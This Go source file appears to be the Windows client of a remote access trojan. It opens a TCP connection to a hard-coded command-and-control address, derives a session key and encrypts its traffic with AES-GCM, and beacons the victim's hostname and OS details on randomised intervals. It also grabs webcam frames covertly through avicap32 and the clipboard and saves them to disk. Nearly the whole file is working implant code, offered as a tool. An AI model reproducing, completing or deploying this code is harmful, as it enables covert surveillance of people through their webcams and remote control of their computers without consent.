package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"image"
	"image/png"
	"log"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows"
)

var (
	CVER              string = "0.2.0"
	TYPE              string = "go"
	chunkSize         int    = 1024
	client            net.Conn
	sessionId         string
	logStream         *log.Logger
	logEnabled        bool   = false
	logpath           string = "logs/client.log"
	address           string = "10.0.0.129"
	port              string = "54678"
	startTime         string = time.Now().UTC().String()
	exitProcess       bool   = false
	retryMode         bool   = false
	maxRetries        int    = 5
	beaconMinInterval uint32 = 5 * 60 * 1000
	beaconMaxInterval uint32 = 45 * 60 * 1000
	retryIntervals           = []int{
		10000,
		30000,
		(1 * 60 * 1000),
		(2 * 60 * 1000),
		(4 * 60 * 1000),
		(6 * 60 * 1000),
	}

	user32   = windows.NewLazySystemDLL("user32.dll")
	gdi32    = windows.NewLazySystemDLL("gdi32.dll")
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	avicap32 = windows.NewLazySystemDLL("avicap32.dll")

	capCreateCaptureWindowA = avicap32.NewProc("capCreateCaptureWindowA")
	sendMessageA            = user32.NewProc("SendMessageA")
	openClipboard           = user32.NewProc("OpenClipboard")
	closeClipboard          = user32.NewProc("CloseClipboard")
	getClipboardData        = user32.NewProc("GetClipboardData")
	globalLock              = kernel32.NewProc("GlobalLock")
	globalUnlock            = kernel32.NewProc("GlobalUnlock")
	globalSize              = kernel32.NewProc("GlobalSize")
	createDIBSection        = gdi32.NewProc("CreateDIBSection")
	deleteDC                = gdi32.NewProc("DeleteDC")
	deleteObject            = gdi32.NewProc("DeleteObject")
)

const (
	WM_CAP_DRIVER_CONNECT    = 0x0400 + 10
	WM_CAP_DRIVER_DISCONNECT = 0x0400 + 11
	WM_CAP_EDIT_COPY         = 0x0400 + 30
	WM_CAP_SET_PREVIEW       = 0x0400 + 50
	WM_CAP_GRAB_FRAME        = 0x0400 + 60

	CF_DIB = 8
)

type (
	BITMAPINFO struct {
		BmiHeader BITMAPINFOHEADER
		BmiColors [1]RGBQUAD
	}
	BITMAPINFOHEADER struct {
		BiSize          uint32
		BiWidth         int32
		BiHeight        int32
		BiPlanes        uint16
		BiBitCount      uint16
		BiCompression   uint32
		BiSizeImage     uint32
		BiXPelsPerMeter int32
		BiYPelsPerMeter int32
		BiClrUsed       uint32
		BiClrImportant  uint32
	}
	RGBQUAD struct {
		RgbBlue     byte
		RgbGreen    byte
		RgbRed      byte
		RgbReserved byte
	}
)

func WriteLog(message string, v ...any) {
	// Ensure the log directory exists
	if err := os.MkdirAll(filepath.Dir(logpath), 0755); err != nil {
		logEnabled = false
		log.Fatalf("Failed to create log directory: %v", err)
	}

	// Open log file
	file, err := os.OpenFile(logpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		logEnabled = false
		log.Fatalf("Failed to open log file: %v", err)
	}
	defer file.Close()

	// Initialize logStream if necessary
	if logStream == nil {
		logStream = log.New(file, "", log.LstdFlags|log.Lshortfile)
	}

	// Format and write the log message
	if logEnabled {
		if len(v) > 0 {
			message = fmt.Sprintf(message, v...)
		}
		logStream.Println(message)
	}
}

func GetSessionID() {
	if client == nil {
		WriteLog("Client is not properly initialized.")
		return
	}

	ipAddress := client.LocalAddr().String()
	if ipAddress == "::1" {
		ipAddress = "127.0.0.1"
	}

	WriteLog("IP Address: %s\n", ipAddress)

	parts := strings.Split(ipAddress, ".")
	sumIp := 0
	for _, part := range parts {
		var partInt int
		fmt.Sscanf(part, "%d", &partInt)
		sumIp += partInt
	}

	data := fmt.Sprintf("%s<>%d", ipAddress, sumIp)
	hash := sha256.New()
	hash.Write([]byte(data))
	hashBytes := hash.Sum(nil)

	crypt := hex.EncodeToString(hashBytes)[:32]
	sessionId = strings.ToLower(crypt)

	WriteLog("Session ID: %s\n", sessionId)
}

func EncryptData(data, sharedKey string) (string, error) {
	salt := make([]byte, 32)
	if _, err := rand.Read(salt); err != nil {
		return "", err
	}

	key := pbkdf2.Key([]byte(sharedKey), salt, 200000, 32, sha512.New)

	iv := make([]byte, 12)
	if _, err := rand.Read(iv); err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aead, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ciphertext := aead.Seal(nil, iv, []byte(data), nil)
	authTag := aead.Overhead()

	encryptedData := fmt.Sprintf("%s:%s:%s:%s",
		base64.StdEncoding.EncodeToString(salt),
		base64.StdEncoding.EncodeToString(iv),
		base64.StdEncoding.EncodeToString(ciphertext[len(ciphertext)-authTag:]),
		base64.StdEncoding.EncodeToString(ciphertext[:len(ciphertext)-authTag]),
	)

	return encryptedData, nil
}

// DecryptData decrypts the encrypted data using AES-256-GCM with the provided sharedKey
func DecryptData(encrypted, sharedKey string) (string, error) {
	parts := strings.Split(encrypted, ":")
	if len(parts) != 4 {
		return "", fmt.Errorf("invalid encrypted data format")
	}

	salt, err := base64.StdEncoding.DecodeString(parts[0])
	if err != nil {
		return "", err
	}

	iv, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return "", err
	}

	authTag, err := base64.StdEncoding.DecodeString(parts[2])
	if err != nil {
		return "", err
	}

	encryptedData, err := base64.StdEncoding.DecodeString(parts[3])
	if err != nil {
		return "", err
	}

	key := pbkdf2.Key([]byte(sharedKey), salt, 200000, 32, sha512.New)

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aead, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ciphertext := append(encryptedData, authTag...)
	decrypted, err := aead.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(decrypted), nil
}

func GetRetryInterval(retries int) int {
	if retries < len(retryIntervals) {
		return retryIntervals[retries]
	}
	return 0
}

// SendCommand sends encrypted data in chunks
func SendCommand(response interface{}) {
	// Encrypt the response
	jsonData, err := json.Marshal(response)
	if err != nil {
		WriteLog("failed to marshal response: %w", err.Error())
	}

	encrypted, err := EncryptData(string(jsonData), sessionId)
	if err != nil {
		WriteLog("failed to encrypt data: %w", err.Error())
	}

	// Split the encrypted data into chunks and send each chunk
	encryptedBytes := []byte(encrypted)
	totalLength := len(encryptedBytes)

	if totalLength >= chunkSize {
		for i := 0; i < totalLength; i += chunkSize {
			end := i + chunkSize
			if end > totalLength {
				end = totalLength
			}

			chunk := encryptedBytes[i:end]
			if end == totalLength {
				chunk = append(chunk, []byte("--FIN--")...)
			}

			WriteLog("Sent Chunk: %s", string(chunk))

			if _, err := client.Write(chunk); err != nil {
				WriteLog("failed to write chunk to client: %w", err)
			}
		}
	} else {
		WriteLog("Sent Data: %s", encrypted)

		if _, err := client.Write(encryptedBytes); err != nil {
			WriteLog("failed to write data to client: %w", err)
		}
	}
}

func SendBeacon() {
	maj, min, patch := windows.RtlGetNtVersionNumbers()
	osver := fmt.Sprintf("%d.%d.%d", maj, min, patch)
	hostname, err := os.Hostname()
	if err != nil {
		WriteLog(err.Error())
		return
	}
	payloadData := map[string]interface{}{
		"response": map[string]interface{}{
			"beacon":   true,
			"version":  CVER,
			"type":     TYPE,
			"platform": runtime.GOOS,
			"arch":     runtime.GOARCH,
			"osver":    osver,
			"hostname": hostname,
		},
	}
	payloadBytes, err := json.Marshal(payloadData)
	if err != nil {
		WriteLog("Failed to marshal JSON payload: " + err.Error())
		return
	}
	payload := string(payloadBytes)
	go SendCommand(payload)
}

func Sleep(ms int) {
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

// utf8To16 converts a UTF-8 string to a UTF-16 encoded byte slice.
func utf8To16(str string) []byte {
	// Convert the UTF-8 string to a slice of UTF-16 code units.
	utf16Codes := utf16.Encode([]rune(str))
	// Allocate a buffer with the size needed to hold UTF-16 code units.
	buffer := bytes.NewBuffer(make([]byte, 0, len(utf16Codes)*2))
	// Write each UTF-16 code unit to the buffer.
	for _, code := range utf16Codes {
		// Write the UTF-16 code unit in little-endian byte order.
		buffer.WriteByte(byte(code))
		buffer.WriteByte(byte(code >> 8))
	}
	return buffer.Bytes()
}

func formatFileName(name, extension string) string {
	now := time.Now()
	year := now.Year()
	month := fmt.Sprintf("%02d", now.Month())
	day := fmt.Sprintf("%02d", now.Day())
	hours := fmt.Sprintf("%02d", now.Hour())
	minutes := fmt.Sprintf("%02d", now.Minute())
	seconds := fmt.Sprintf("%02d", now.Second())
	// Remove leading dot from extension if it exists
	ext := strings.TrimPrefix(extension, ".")
	// Format the filename
	return fmt.Sprintf("%s_%d-%s-%s_%s-%s-%s.%s", name, year, month, day, hours, minutes, seconds, ext)
}

func CaptureWebcam() error {
	handle, _, err := capCreateCaptureWindowA.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("WebcamCapture"))),
		0, 0, 0, 320, 240, 0, 0)
	if handle == 0 {
		return fmt.Errorf("failed to create capture window: %v", err)
	}
	defer sendMessageA.Call(handle, WM_CAP_DRIVER_DISCONNECT, 0, 0)

	ret, _, err := sendMessageA.Call(handle, WM_CAP_DRIVER_CONNECT, 0, 0)
	if ret == 0 {
		return fmt.Errorf("failed to connect to driver: %v", err)
	}

	sendMessageA.Call(handle, WM_CAP_SET_PREVIEW, 1, 0)
	sendMessageA.Call(handle, WM_CAP_GRAB_FRAME, 0, 0)
	sendMessageA.Call(handle, WM_CAP_EDIT_COPY, 0, 0)

	img, err := getImageFromClipboard()
	if err != nil {
		return fmt.Errorf("failed to get image from clipboard: %v", err)
	}

	filename := formatFileName("wc", "png")
	if err := saveImageAsPNG(img, filename); err != nil {
		return fmt.Errorf("failed to save image: %v", err)
	}

	return nil
}

// Retrieves an image from the clipboard.
func getImageFromClipboard() (image.Image, error) {
	ret, _, _ := openClipboard.Call(0)
	if ret == 0 {
		return nil, fmt.Errorf("failed to open clipboard")
	}
	defer closeClipboard.Call()

	handle, _, _ := getClipboardData.Call(CF_DIB)
	if handle == 0 {
		return nil, fmt.Errorf("failed to get clipboard data")
	}

	size, _, _ := globalSize.Call(handle)
	ptr, _, _ := globalLock.Call(handle)
	if ptr == 0 {
		return nil, fmt.Errorf("failed to lock global memory")
	}
	defer globalUnlock.Call(handle)

	bitmapInfo := (*BITMAPINFO)(unsafe.Pointer(ptr))
	width := int(bitmapInfo.BmiHeader.BiWidth)
	height := int(bitmapInfo.BmiHeader.BiHeight)
	biSize := uintptr(bitmapInfo.BmiHeader.BiSize)
	colorTableSize := uintptr(bitmapInfo.BmiHeader.BiClrUsed) * unsafe.Sizeof(RGBQUAD{})
	dataOffset := biSize + colorTableSize

	// Calculate the data size correctly
	dataSize := uintptr(size) - dataOffset

	var bits unsafe.Pointer
	hdc, _, _ := createDIBSection.Call(0, uintptr(unsafe.Pointer(bitmapInfo)), 0, uintptr(unsafe.Pointer(&bits)), 0, 0)
	if hdc == 0 {
		return nil, fmt.Errorf("failed to create DIB section")
	}
	defer deleteObject.Call(hdc)

	// Copy image data to bits
	dataPtr := uintptr(ptr) + dataOffset
	copy((*[1 << 30]byte)(bits)[:dataSize:dataSize], (*[1 << 30]byte)(unsafe.Pointer(dataPtr))[:dataSize:dataSize])

	// Create an image
	img := &image.RGBA{
		Pix:    (*[1 << 30]uint8)(bits)[:width*height*4],
		Stride: width * 4,
		Rect:   image.Rect(0, 0, width, height),
	}

	return img, nil
}

func saveImageAsPNG(img image.Image, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	return png.Encode(file, img)
}

func HandleConnection(conn net.Conn) {
	// Close the connection when we're done
	defer conn.Close()

	// Read incoming data
	buf := make([]byte, 1024)
	_, err := conn.Read(buf)
	if err != nil {
		WriteLog(err.Error())
		return
	}

	WriteLog("Received: %s", buf)
}

func ConnectToServer() {
	for !exitProcess {
		// Connect to the server
		conn, err := net.Dial("tcp", address+":"+port)
		if err != nil {
			WriteLog(err.Error())
			exitProcess = true
		}

		client = conn

		if len(sessionId) == 0 {
			go GetSessionID()
		}

		// Send a beacon

		// Handle read response
		go HandleConnection(client)
	}
}

func main() {
	go ConnectToServer()
}
